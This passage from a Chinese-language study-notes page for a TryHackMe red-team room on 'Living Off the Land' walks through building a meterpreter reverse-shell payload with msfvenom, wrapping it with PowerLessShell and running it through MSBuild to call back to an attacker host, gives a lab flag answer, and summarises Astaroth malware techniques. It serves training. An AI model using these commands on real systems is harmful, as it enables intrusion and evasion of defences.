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" width="550" height="200" class="img_ev3q"></p>
<p>PowerLessShell 是一个基于 Python 的工具，用于生成恶意代码，在目标机器上运行而不显示 PowerShell 进程实例。PowerLessShell 依赖于滥用 Microsoft Build Engine (MSBuild)，这是一个用于构建 Windows 应用程序的平台，用来执行远程代码。</p>
<p>首先，让我们从 GitHub 仓库下载该项目的副本到攻击机（AttackBox）上：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>项目的一个要求是获取一个 PowerShell 有效载荷，使其适用于与 MSBuild 一起工作。在攻击机（AttackBox）上，我们需要使用 <code>msfvenom</code> 生成一个 PowerShell 有效载荷，如下所示：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection &gt; liv0ff.ps1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>此外，我们需要运行 Metasploit 框架来监听并等待反向 Shell 连接。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload generic/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; windows/meterpreter/reverse_winhttps</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lhost =&gt; AttackBox_IP lport =&gt; 4443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started HTTPS reverse handler on https://AttackBox_IP:4443</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们已经准备好有效载荷，切换到 PowerLessShell 项目的目录，将有效载荷转换为与 MSBuild 工具兼容的格式。然后运行 PowerLessShell 工具，并将源文件设置为我们使用 msfvenom 创建的文件，如下所示：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦命令成功执行，我们需要将输出文件传输到 Windows 机器。你可以使用 SCP 命令，或者设置一个 Web 服务器在 AttackBox 上托管文件（<code>python3 -m http.server 1337</code>），然后通过浏览器下载该文件。</p>
<p>最后，在目标 Windows 机器上，构建 <code>.csproj</code> 文件并等待反向 Shell 连接！</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦我们运行 MSBuild 命令，等待几秒钟，直到接收到反向 Shell 连接。请注意，期间不会有 powershell.exe 进程在运行。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>复制“无 PowerShell”技术的步骤，在 4444 端口接收反向 Shell。连接建立后，桌面上将自动创建一个标志文件。标志文件的内容是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{23005dc4369a0eef728aa39ff8cc3be2}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="real-life-scenario---真实场景">Real-life Scenario - 真实场景<a href="#real-life-scenario---真实场景" class="hash-link" aria-label="Direct link to Real-life Scenario - 真实场景" title="Direct link to Real-life Scenario - 真实场景">​</a></h2>
<p>本任务展示了使用本房间中讨论的技术的恶意软件案例。</p>
<p>在 2017 年，Windows Defender 高级威胁防护（<a href="https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/" target="_blank" rel="noopener noreferrer">Windows Defender ATP</a>）研究团队发现了名为 <strong>Astaroth</strong> 的无文件恶意软件。无文件恶意软件意味着恶意软件在系统中运行并执行其功能，而不写入磁盘。该恶意软件完全通过受害者设备的内存执行所有操作。<img decoding="async" loading="lazy" alt=" " src="/assets/images/312a048b77af0ef89fab949cd9b753b4-6051cf0c37835e2a82726b50f794e05f.png" width="740" height="420" class="img_ev3q"></p>
<ol>
<li>
<p><strong>Astaroth</strong> 被称为一种 <strong>信息窃取器</strong>，它窃取受害者的敏感信息，如账户凭据、按键记录和其他数据，并将其发送给攻击者。该恶意软件依赖多种先进的技术，如反调试、反虚拟化、反仿真技巧、进程空洞、NTFS 替代数据流（ADS）以及利用操作系统现有工具来执行不同功能的技术。</p>
<p>在初始访问阶段，攻击者依赖于包含恶意附件文件的垃圾邮件攻击。附加文件是一个 LNK 文件快捷方式，一旦受害者点击它，会导致以下操作：</p>
<ul>
<li>执行 <strong>WMIC</strong> 命令来下载并运行 Javascript 代码。</li>
<li>利用 <strong>BITSadmin</strong> 下载多个来自指挥控制服务器的二进制文件。有趣的是，在某些情况下，恶意软件使用 YouTube 频道描述来隐藏其 C2 服务器命令。</li>
<li>使用 <strong>BITSadmin</strong> 和 ADS 技术，将其二进制文件隐藏在系统中以实现持久化。</li>
<li>使用 <strong>Certutil</strong> 工具解码下载的几个有效载荷到 DLL 文件中。</li>
<li>使用 <strong>Regsvr32</strong> 执行 DLL 文件。</li>
</ul>
<p>有关恶意软件及其检测的更多详细信息，建议查看以下参考资料：</p>
<ol>
<li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/" target="_blank" rel="noopener noreferrer">Astaroth: Banking Trojan</a></li>
<li><a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer" target="_blank" rel="noopener noreferrer">Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer</a></li>
<li><a href="https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/" target="_blank" rel="noopener noreferrer">Astaroth malware hides command servers in YouTube channel descriptions</a></li>
</ol>
</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion---结论">Conclusion - 结论<a href="#conclusion---结论" class="hash-link" aria-label="Direct link to Conclusion - 结论" title="Direct link to Conclusion - 结论">​</a></h2>
<p>在本课程中，我们介绍了 <strong>Living Off the Land</strong> 的概念，并讨论了在红队演练中常见的一些技术。Living Off the Land 技术可以用于多种目的，包括侦察、文件操作、执行二进制文件、持久化以及绕过安全防护措施。</p>
<p><strong>附加资源</strong></p>
<ul>
<li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> - 这是 LOLBAS 项目的 Linux 版本。</li>
<li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/" target="_blank" rel="noopener noreferrer">Astaroth: Banking Trojan</a> - 这是一个真实的恶意软件分析案例，展示了恶意软件如何使用 Living Off the Land 技术。</li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Evading Logging and Monitoring - 绕过日志记录和监控</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction---简介" class="table-of-contents__link toc-highlight">Introduction - 简介</a><ul><li><a href="#什么是living-off-the-land" class="table-of-contents__link toc-highlight">什么是“Living Off the Land”？</a></li><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li><li><a href="#先决条件" class="table-of-contents__link toc-highlight">先决条件</a></li></ul></li><li><a href="#windows-sysinternals" class="table-of-contents__link toc-highlight">Windows Sysinternals</a><ul><li><a href="#什么是-windows-sysinternals" class="table-of-contents__link toc-highlight">﻿什么是 Windows Sysinternals？</a></li><li><a href="#sysinternals-live" class="table-of-contents__link toc-highlight">Sysinternals Live</a></li><li><a href="#红队的利用及其优势" class="table-of-contents__link toc-highlight">红队的利用及其优势</a></li></ul></li><li><a href="#lolbas-project---lolbas-项目" class="table-of-contents__link toc-highlight">LOLBAS Project - LOLBAS 项目</a><ul><li><a href="#什么是-lolbas" class="table-of-contents__link toc-highlight">什么是 LOLBAS？</a></li><li><a href="#工具标准" class="table-of-contents__link toc-highlight">工具标准</a></li><li><a href="#有趣的功能" class="table-of-contents__link toc-highlight">有趣的功能</a></li></ul></li><li><a href="#file-operations---文件操作" class="table-of-contents__link toc-highlight">File Operations - 文件操作</a><ul><li><a href="#certutil" class="table-of-contents__link toc-highlight">Certutil</a></li><li><a href="#bitsadmin" class="table-of-contents__link toc-highlight">BITSAdmin</a></li><li><a href="#findstr" class="table-of-contents__link toc-highlight">FindStr</a></li></ul></li><li><a href="#file-execution---文件执行" class="table-of-contents__link toc-highlight">File Execution - 文件执行</a><ul><li><a href="#文件资源管理器" class="table-of-contents__link toc-highlight">文件资源管理器</a></li><li><a href="#wmic" class="table-of-contents__link toc-highlight">WMIC</a></li><li><a href="#rundll32" class="table-of-contents__link toc-highlight">Rundll32</a></li></ul></li><li><a href="#application-whitelisting-bypasses---应用程序白名单绕过" class="table-of-contents__link toc-highlight">Application Whitelisting Bypasses - 应用程序白名单绕过</a><ul><li><a href="#绕过应用程序白名单" class="table-of-contents__link toc-highlight">绕过应用程序白名单</a></li><li><a href="#regsvr32" class="table-of-contents__link toc-highlight">Regsvr32</a></li><li><a href="#bourne-again-shell-bash" class="table-of-contents__link toc-highlight">Bourne Again Shell (Bash)</a></li></ul></li><li><a href="#other-techniques---其他技术" class="table-of-contents__link toc-highlight">Other Techniques - 其他技术</a><ul><li><a href="#快捷方式" class="table-of-contents__link toc-highlight">快捷方式</a></li><li><a href="#禁用-powershell" class="table-of-contents__link toc-highlight">禁用 PowerShell！</a></li></ul></li><li><a href="#real-life-scenario---真实场景" class="table-of-contents__link toc-highlight">Real-life Scenario - 真实场景</a></li><li><a href="#conclusion---结论" class="table-of-contents__link toc-highlight">Conclusion - 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">No Copyright © 2025 This is just PgDn's Notes, Sorry. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>